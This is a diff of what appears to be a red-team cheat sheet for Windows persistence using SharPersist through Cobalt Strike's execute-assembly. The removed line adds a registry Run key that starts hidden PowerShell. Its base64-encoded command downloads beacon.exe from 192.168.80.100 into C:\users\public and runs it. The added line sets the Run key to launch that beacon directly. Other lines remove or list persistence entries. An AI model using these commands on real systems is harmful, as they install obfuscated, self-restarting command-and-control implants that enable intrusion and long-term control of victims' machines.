@@ -28,7 +28,7 @@ execute-assembly /root/SharPersist.exe -t startupfolder -f "Name" -m remove
 
 ### Registry AutoRun (Admin Access for "hklmrun")
 ```powershell
-execute-assembly /root/SharPersist.exe -t reg -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc IAAkAHcAYwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA4ADAALgAxADAAMAAvAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgAsACAAIgBDADoAXAB1AHMAZQByAHMAXABwAHUAYgBsAGkAYwBcAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAiAEMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAYgBlAGEAYwBvAG4ALgBlAHgAZQAiADsAIAA=" -k "hkcurun" -v "Name" -m add
+execute-assembly /root/SharPersist.exe -t reg -c "C:\users\public\beacon.exe" -k "hkcurun" -v "Name" -m add
 execute-assembly /root/SharPersist.exe -t reg -k "hkcurun" -v "Name" -m remove
 execute-assembly /root/SharPersist.exe -t reg -k "hkcurun" -m list
 ```
